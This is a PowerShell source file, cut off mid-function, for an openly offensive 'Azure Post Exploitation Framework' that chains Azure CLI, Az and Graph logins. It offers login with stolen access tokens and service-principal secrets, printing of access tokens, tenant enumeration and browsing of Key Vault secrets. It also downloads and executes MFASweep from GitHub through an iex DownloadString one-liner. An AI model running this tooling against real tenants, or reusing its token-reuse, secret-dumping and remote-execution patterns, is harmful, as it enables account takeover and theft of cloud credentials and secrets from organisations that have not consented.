# Post Exploitation Tool for MS Cloud
# Combines Azure CLI and the Az and Graph PS Modules
# Optimized and tested with PS7. Some functions might not work with PS5

# Global variables to store tenant information and login accounts
$Global:tenantDomain = "Not set"
$Global:tenantID = "Not set"
$Global:azureCliAccount = "Not logged in"
$Global:azureCliId = "N/A"
$Global:azureCliSPName = "N/A"
$Global:azModuleAccount = "Not logged in"
$Global:azModuleId = "N/A"
$Global:azModuleSPName = "N/A"
$Global:graphModuleAccount = "Not logged in"
$Global:graphModuleId = "N/A"

# Header information for all menus
function DisplayHeader {
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "==== APEX - Azure Post Exploitation Framework ====" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Tenant Name: $tenantDomain" -ForegroundColor $(if ($tenantDomain -eq "Not set") { "Red" } else { "Green" })
    Write-Host "Tenant ID: $tenantID" -ForegroundColor $(if ($tenantID -eq "Not set") { "Red" } else { "Green" })
    Write-Host "Azure CLI Account Name: $azureCliAccount" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Azure CLI Account Object ID: $azureCliId" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Azure CLI Account Service Principal Name: $azureCliSPName" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Az PS Module Account: $azModuleAccount" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Az PS Module Object ID: $azModuleId" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Az PS Module Service Principal Name: $azModuleSPName" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Graph PS Module Account Name: $graphModuleAccount" -ForegroundColor $(if ($graphModuleAccount -eq "Not logged in") { "Red" } else { "DarkYellow" })
    Write-Host "Graph PS Module Objet ID: $graphModuleId" -ForegroundColor $(if ($graphModuleAccount -eq "Not logged in") { "Red" } else { "DarkYellow" })
    Write-Host ""
}

# Function to clear Azure CLI details
function ResetAzureCliDetails {
    $Global:azureCliAccount = "Not logged in"
    $Global:azureCliId = "N/A"
    $Global:azureCliSPName = "N/A"
}

# Function to clear Az PowerShell module details
function ResetAzModuleDetails {
    $Global:azModuleAccount = "Not logged in"
    $Global:azModuleId = "N/A"
    $Global:azModuleSPName = "N/A"
}

# Function to clear Graph PowerShell module details
function ResetGraphModuleDetails {
    $Global:graphModuleAccount = "Not logged in"
    $Global:graphModuleId = "N/A"
}

# Function to set the tenant using an external API
function Set-Tenant {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Set Tenant Menu" -ForegroundColor Cyan
        Write-Host "Enter tenant domain:" -ForegroundColor Yellow
        $tenantDomainInput = Read-Host

        if ($tenantDomainInput -eq "B") {
            return
        }

        if ($tenantDomainInput) {
            try {
                $TenantId = (Invoke-RestMethod -UseBasicParsing -Uri "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=$tenantDomainInput").TenantId
                
                if ($TenantId) {
                    $Global:tenantID = $TenantId
                    $Global:tenantDomain = $tenantDomainInput
                    Write-Host "Tenant set to: $tenantDomain (ID: $tenantID)" -ForegroundColor Green
                    break
                } else {
                    Write-Host "Failed to retrieve tenant ID. The domain might be incorrect." -ForegroundColor Red
                }
            }
            catch {
                Write-Host "Failed to retrieve tenant details. The domain might be incorrect." -ForegroundColor Red
            }
        } else {
            Write-Host "Invalid tenant input." -ForegroundColor Red
        }
    }
}

# Function to logout of all services and clear tenant information
function Logout-AllServices {
    Clear-Host
    DisplayHeader
    Write-Host "Logging out of all services and clearing tenant information..." -ForegroundColor Yellow

    try {
        az logout
        Write-Host "Logged out of Azure CLI." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Azure CLI." -ForegroundColor Red
    }

    try {
        Disconnect-AzAccount -ErrorAction Stop
        Write-Host "Logged out of Az PowerShell module." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Az PowerShell module." -ForegroundColor Red
    }

    try {
        Disconnect-MgGraph -ErrorAction Stop
        Write-Host "Logged out of Microsoft Graph PowerShell module." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Microsoft Graph PowerShell module." -ForegroundColor Red
    }

    $Global:tenantDomain = "Not set"
    $Global:tenantID = "Not set"
    $Global:azureCliAccount = "Not logged in"
    $Global:azModuleAccount = "Not logged in"
    $Global:graphModuleAccount = "Not logged in"

    Write-Host "Tenant information and accounts have been cleared." -ForegroundColor Green
    Write-Host "`nPress any key to return to the main menu..." 
    [void][System.Console]::ReadKey($true)
}

# Function to check if Azure CLI is installed and up to date
function Check-AzureCLI {
    Write-Host "Checking if az CLI is installed..."
    
    try {
        $versionRawOutput = az --version

        $hasUpdates = $false
        $versionRawOutput | ForEach-Object { 
            Write-Host $_
        }
        
        if ($versionRawOutput -match 'WARNING: You have \d+ update\(s\) available.') {
            Write-Host "Updates are available for az CLI." -ForegroundColor Yellow
            $upgradeChoice = Read-Host -Prompt "Would you like to upgrade to the latest version? (Y/N)"
            if ($upgradeChoice -eq "Y") {
                Write-Host "Upgrading az CLI..."
                az upgrade --yes
            }
        } else {
            Write-Host "az CLI is up to date." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "az CLI is not installed." -ForegroundColor Red
        $installChoice = Read-Host -Prompt "Would you like to install it? (Y/N)"
        if ($installChoice -eq "Y") {
            Write-Host "Installing az CLI..."
            Invoke-Expression "Invoke-WebRequest -Uri https://aka.ms/InstallAzureCliWindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -ArgumentList '/i', '.\AzureCLI.msi', '/quiet', '/norestart' -Wait; Remove-Item -Force .\AzureCLI.msi"
            Write-Host "az CLI installed successfully." -ForegroundColor Green
        }
    }
}

# Function to check if a PowerShell module is installed, can be imported, and needs an update
function Check-UpdateModule {
    param (
        [string]$moduleName
    )

    Write-Host "Checking availability of $moduleName module..."

    if (Get-Module -ListAvailable -Name $moduleName) {
        try {
            if (-not (Get-Module -Name $moduleName)) {
                Write-Host "Importing $moduleName module..."
                Import-Module $moduleName -ErrorAction Stop
            }
            Write-Host "$moduleName module is installed and successfully imported." -ForegroundColor Green

            # Check for module updates
            Write-Host "Checking for updates for $moduleName module..."
            $moduleVersion = (Get-InstalledModule -Name $moduleName).Version
            $availableVersion = (Find-Module -Name $moduleName).Version

            if ($moduleVersion -lt $availableVersion) {
                Write-Host "A newer version of $moduleName module is available." -ForegroundColor Yellow
                $updateChoice = Read-Host -Prompt "Would you like to update $moduleName module? (Y/N)"
                if ($updateChoice -eq "Y") {
                    Write-Host "Updating $moduleName module..."
                    Update-Module -Name $moduleName -Force
                    Write-Host "$moduleName module updated successfully." -ForegroundColor Green
                }
            } else {
                Write-Host "$moduleName module is up to date." -ForegroundColor Green
            }
        }
        catch {
            Write-Host "Unable to import $moduleName module despite it being installed." -ForegroundColor Red
        }
    }
    else {
        Write-Host "$moduleName module is not installed." -ForegroundColor Yellow
        $installChoice = Read-Host -Prompt "Would you like to install it? (Y/N)"
        if ($installChoice -eq "Y") {
            Write-Host "Installing $moduleName module..."
            Install-Module -Name $moduleName -AllowClobber -Scope CurrentUser -Force
            Write-Host "Importing $moduleName module..."
            Import-Module $moduleName -ErrorAction Stop
            Write-Host "$moduleName module was successfully installed and imported." -ForegroundColor Green
        }
    }
}

# Login menu structure
function LoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Login Menu" -ForegroundColor Cyan
        Write-Host "1. Azure CLI Login"
        Write-Host "2. Az PowerShell Module Login"
        Write-Host "3. Microsoft Graph PowerShell Module Login"
        Write-Host "4. Get AccessToken"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                AzureCLILoginMenu
            }
            "2" {
                AzPSLoginMenu
            }
            "3" {
                GraphPSLoginMenu
            }
            "4" {
                GetAccessToken
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to get access tokens
function GetAccessToken {
    Clear-Host
    DisplayHeader
    Write-Host "Get Access Token" -ForegroundColor Cyan
    Write-Host "Select tool to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    $toolChoice = Read-Host

    try {
        Clear-Host
        DisplayHeader
        if ($toolChoice -eq "1") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            az account get-access-token --output json
        }
        elseif ($toolChoice -eq "2") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $token = Get-AzAccessToken
            Write-Host "Token: $($token.Token)" -ForegroundColor Green
        }
        else {
            Write-Host "Invalid selection, please try again." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error fetching access token: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Azure CLI Login Menu
function AzureCLILoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Azure CLI Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Service Principal"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-AzureCLI
            }
            "2" {
                Login-AzureCLI-SP
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Azure CLI
function Login-AzureCLI {
    ResetAzureCliDetails
    Write-Host "Logging into Azure CLI using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        az logout
        if ($tenantID -ne "Not set") {
            $result = az login --tenant $tenantID --output json
            $loginInfo = $result | ConvertFrom-Json | Select-Object -First 1
            $Global:azureCliAccount = $loginInfo.user.name

            # Fetch Object ID using the logged-in user
            $userId = az ad user show --id $loginInfo.user.name --query id -o tsv
            $Global:azureCliId = $userId

            Write-Host "Successfully logged into Azure CLI as $azureCliAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error during Azure CLI login: $_" -ForegroundColor Red
    }
}

# Function to login to Azure CLI as a service principal
function Login-AzureCLI-SP {
    ResetAzureCliDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Azure CLI as Service Principal" -ForegroundColor Cyan
    Write-Host "Enter the application (client) ID:" -ForegroundColor Yellow
    $appId = Read-Host

    Write-Host "Enter the client secret:" -ForegroundColor Yellow
    $clientSecret = Read-Host

    try {
        az logout

        az login --service-principal -u $appId -p $clientSecret --tenant $Global:tenantId

        $spDetails = az ad sp show --id $appId --query "{Name: displayName, Id: id, SpName: appId}" -o json | ConvertFrom-Json
        $Global:azureCliAccount = $spDetails.Name
        $Global:azureCliId = $spDetails.Id
        $Global:azureCliSPName = $spDetails.SpName
        
        Write-Host "Successfully logged into Azure CLI as Service Principal ($spDetails.Name)." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to login to Azure CLI as Service Principal: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Az PowerShell Module Login Menu
function AzPSLoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Az PowerShell Module Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Access Token"
        Write-Host "3. Device Code"
        Write-Host "4. Service Principal"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-AzModule
            }
            "2" {
                Login-AzModule-AT
            }
            "3" {
                Login-AzModule-DC
            }
            "4" {
                Login-AzModule-SP
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Az PowerShell module
function Login-AzModule {
    ResetAzModuleDetails
    Write-Host "Logging into Az PowerShell module using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -Tenant $tenantID -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
    }
}

# Function to login to Az PowerShell module with AccessToken
function Login-AzModule-AT {
    ResetAzModuleDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Az PS Module with Access Token" -ForegroundColor Cyan
    Write-Host "Enter the Access Token" -ForegroundColor Yellow
    $AccessToken = Read-Host

    Write-Host "Enter the Account (Id or Name)" -ForegroundColor Yellow
    $id = Read-Host

   # Log out of existing sessions
    Disconnect-AzAccount -ErrorAction SilentlyContinue

    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -accesstoken $AccessToken -AccountId $id -TenantId $Global:tenantID -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
    }
}

# Function to login to Az PowerShell module
function Login-AzModule-DC {
    ResetAzModuleDetails
    Write-Host "Logging into Az PS module via Device Code flow using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -Tenant $tenantID -devicecode -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
    }
}

# Function to login to Az PowerShell module as a service principal
function Login-AzModule-SP {
    ResetAzModuleDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Az PS Module as Service Principal" -ForegroundColor Cyan
    Write-Host "Enter the application (client) ID:" -ForegroundColor Yellow
    $appId = Read-Host

    Write-Host "Enter the client secret:" -ForegroundColor Yellow
    $clientSecret = Read-Host

   # Log out of existing sessions
    Disconnect-AzAccount -ErrorAction SilentlyContinue

    # Convert client secret to SecureString and create PSCredential
    $secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
    $psCredential = [System.Management.Automation.PSCredential]::new($appId, $secureSecret)
    
    try {
        Connect-AzAccount -ServicePrincipal -Credential $psCredential -TenantId $Global:tenantID -ErrorAction Stop
        $spDetails = Get-AzADServicePrincipal -ApplicationId $appId
        $Global:azModuleAccount = $spDetails.AppDisplayName 
        $Global:azModuleId = $spDetails.Id
        $Global:azModuleSPName = $spDetails.AppId

        Write-Host "Successfully logged into Az PowerShell module as Service Principal ($spDetails.DisplayName)." -ForegroundColor Green
    }
    catch {
        Write-Host "Detailed error during login: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Microsoft Graph PowerShell Module Login Menu
function GraphPSLoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Microsoft Graph PowerShell Module Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Access Token"
        Write-Host "3. Device Code"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-GraphModule
            }
            "2" {
                Login-GraphModule-AT
            }
            "3" {
                Login-GraphModule-DC
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Microsoft Graph PowerShell module
function Login-GraphModule {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -TenantId $tenantID -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PS module as $graphModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PS module: $_" -ForegroundColor Red
    }
}

# Function to login to Microsoft Graph PowerShell module via Access Token
function Login-GraphModule-AT {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module with Access Token using tenant '$tenantID'..." -ForegroundColor Yellow
    Write-Host "Enter the Access Token" -ForegroundColor Yellow
    $AccessToken = Read-Host
    $SecureToken = $AccessToken | ConvertTo-SecureString -AsPlainText -Force

    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -AccessToken $SecureToken -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
    }
}

# Function to login to Microsoft Graph PowerShell module via Devicecode
function Login-GraphModule-DC {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module via Device Code flow using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -TenantId $tenantID -UseDeviceAuthentication -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
    }
}

# Queries menu structure
function QueriesMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Queries Menu" -ForegroundColor Cyan
        Write-Host "1. User Info"
        Write-Host "2. User Groups"
        Write-Host "3. Group Members"
        Write-Host "4. Role Assignments"
        Write-Host "5. Available Resources"
        Write-Host "6. Key Vaults"
        Write-Host "7. Storage"
        Write-Host "8. Owned Objects"
        Write-Host "9. Owned Applications"
        Write-Host "10. Administrative Units (Graph only)"
        Write-Host "11. Password Policy (Graph only)"
        Write-Host "12. Get App Details (CLI only)"
        Write-Host "13. Dynamic Groups (Graph only)"
        Write-Host "14. MFASweep - Imports and runs Dafthack's MFASweep"
        Write-Host "15. Raw Command Prompt"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                UserInfoQuery
            }
            "2" {
                UserGroupsQuery
            }
            "3" {
                GroupMembersQuery
            }
            "4" {
                RoleAssignmentsQuery
            }
            "5" {
                AvailableResourcesQuery
            }
            "6" {
                AvailableKeyVaultsQuery
            }
            "7" {
                StorageMenu
            }
            "8" {
                OwnedObjectsQuery
            }
            "9" {
                OwnedApplicationsQuery
            }
            "10" {
                AdministrativeUnitsQuery
            }
            "11" {
                PasswordPolicyQuery
            }
            "12" {
                GetAppDetailsQuery
            }
            "13" {
                DynamicGroupsQuery
            }
            "14" {
                MFASweep
            }
            "15" {
                RawCommandPrompt
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
function MFASweep {
    Clear-Host
    DisplayHeader
    Write-Host "MFA Sweep" -ForegroundColor Cyan

    # Download and execute MFASweep 
    Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
    iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
    Invoke-MFASweep
    
    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query dynamic groups using Microsoft Graph PowerShell
function DynamicGroupsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Dynamic Groups Query" -ForegroundColor Cyan

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Graph PS Module output:" -ForegroundColor Magenta
        
        # Fetch dynamic groups using Microsoft Graph PowerShell
        $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" 

        foreach ($group in $dynamicGroups) {
            $groupName = $group.DisplayName
            $membershipQuery = $group.MembershipRule
            $Description = $group.Description
            Write-Output "Group Name: $groupName"
            Write-Output "Description: $Description" 
            Write-Output "Membership Query: $membershipQuery"
            Write-Output ""
        }
    }
    catch {
        Write-Host "Error retrieving dynamic groups: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query owned applications
function OwnedApplicationsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Owned Applications Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            
            # List all Azure AD applications and check ownership
            $apps = az ad app list --query '[].{Name: displayName, AppId: appId, ObjectId: id}' -o json | ConvertFrom-Json
            $ownedApps = foreach ($app in $apps) {
                $owners = az ad app owner list --id $app.ObjectId --query '[].id' -o tsv
                if ($owners -contains $userId) {
                    [PSCustomObject]@{
                        DisplayName = $app.Name
                        AppId = $app.AppId
                        ObjectId = $app.ObjectId
                    }
                }
            }

            if ($ownedApps) {
                $cliOutput = $ownedApps | Format-Table -AutoSize | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "No owned applications found for the user." -ForegroundColor Yellow
            }
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $ownedObjects = Get-MgUserOwnedObject -UserId $userId -All
            $apps = $ownedObjects | Where-Object { $_.AdditionalProperties.'@odata.type' -eq '#microsoft.graph.application' }
            $graphOutput = $apps | ForEach-Object {
                [PSCustomObject]@{
                    DisplayName = $_.AdditionalProperties['displayName']
                    AppId = $_.AdditionalProperties['appId']
                    ObjectId = $_.Id
                }
            } | Format-Table -AutoSize | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving owned applications: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query app details
function GetAppDetailsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Get App Details Query" -ForegroundColor Cyan
    Write-Host "Enter the app display name:" -ForegroundColor Yellow
    $appName = Read-Host

    Start-Sleep -Seconds 2  # Delay to ensure environment stability

    try {
        Clear-Host
        DisplayHeader
        Write-Host "AZ CLI output:" -ForegroundColor Magenta
        $cliOutput = az ad app list --query "[?displayName=='$appName'] | [0].{DisplayName:displayName, Application_ID:appId, Object_ID:id}" --output table | Out-String
        Write-Host $cliOutput
    }
    catch {
        Write-Host "Error retrieving app details: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query password policy
function PasswordPolicyQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Password Policy Query" -ForegroundColor Cyan
    Write-Host "This query will be performed using Microsoft Graph PowerShell Module." -ForegroundColor Yellow

    Start-Sleep -Seconds 2  # Delay to ensure environment stability

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Graph PS Module output:" -ForegroundColor Magenta
        $policy = Get-MgBetaDirectorySetting | Where-Object { $_.templateId -eq "5cf42378-d67d-4f36-ba46-e8b86229381d" } | ConvertTo-Json -Depth 50
        $output = $policy | Format-Table | Out-String
        Write-Host $output
    }
    catch {
        Write-Host "Error retrieving password policy: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query available Key Vaults and interact with secrets
function AvailableKeyVaultsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Available Key Vaults Query" -ForegroundColor Cyan

    Write-Host "Select tool to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        $keyVaultList = @()

        # List key vaults
        try {
            if ($toolChoice -eq "1") {
                Write-Host "AZ CLI output:" -ForegroundColor Magenta
                $cliOutput = az keyvault list --query "[].name" -o tsv
                $keyVaultList = $cliOutput -split "`n"
            } elseif ($toolChoice -eq "2") {
                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
                $psOutput = Get-AzKeyVault | Select-Object -ExpandProperty VaultName
                $keyVaultList = $psOutput -split "`n"
            } else {
                Write-Host "Invalid selection, returning to queries menu." -ForegroundColor Red
                return
            }
        } catch {
            Write-Host "Error retrieving Key Vaults: $_" -ForegroundColor Red
        }

        if ($keyVaultList.Count -gt 0) {
            while ($true) {
                Write-Host "Select a Key Vault to explore:" -ForegroundColor Yellow
                for ($i = 0; $i -lt $keyVaultList.Count; $i++) {
                    Write-Host "$($i + 1). $($keyVaultList[$i])" -ForegroundColor Green
                }
                Write-Host "B. Back to tool selection" -ForegroundColor Cyan
                Write-Host "M. Return to main menu" -ForegroundColor Cyan

                $selectedOption = Read-Host "Enter a number to select a vault, 'B', or 'M'"

                if ($selectedOption -eq "B") {
                    break
                }

                if ($selectedOption -eq "M") {
                    return
                }

                if ($selectedOption -ge 1 -and $selectedOption -le $keyVaultList.Count) {
                    $selectedVault = $keyVaultList[$selectedOption - 1]
                    Write-Host "`nExploring secrets in '$selectedVault' Key Vault..." -ForegroundColor Yellow

                    # List secrets
                    try {
                        $secrets = if ($toolChoice -eq "1") {
                            az keyvault secret list --vault-name $selectedVault --query "[].name" -o tsv
                        } elseif ($toolChoice -eq "2") {
                            Get-AzKeyVaultSecret -VaultName $selectedVault | Select-Object -ExpandProperty Name
                            }
                        
                        $secretList = $secrets -split "`n"
                        if ($secretList.Count -gt 0) {
                            while ($true) {
                                Write-Host "Select a secret to view its content:" -ForegroundColor Yellow
                                for ($i = 0; $i -lt $secretList.Count; $i++) {
                                    Write-Host "$($i + 1). $($secretList[$i])" -ForegroundColor Green
                                }
                                Write-Host "B. Back to vault selection" -ForegroundColor Cyan
                                Write-Host "M. Return to main menu" -ForegroundColor Cyan

                                $selectedSecret = Read-Host "Enter a number to view a secret, 'B', or 'M'"

                                if ($selectedSecret -eq "B") {
                                    break
                                }

                                if ($selectedSecret -eq "M") {
                                    return
                                }

                                if ($selectedSecret -ge 1 -and $selectedSecret -le $secretList.Count) {
                                    $secretName = $secretList[$selectedSecret - 1]
                                    Write-Host "`nViewing content of secret '$secretName'..." -ForegroundColor Yellow

                                    # Retrieve secret content
                                    $secretContent = if ($toolChoice -eq "1") {
                                        az keyvault secret show --vault-name $selectedVault --name $secretName --query "value" -o tsv
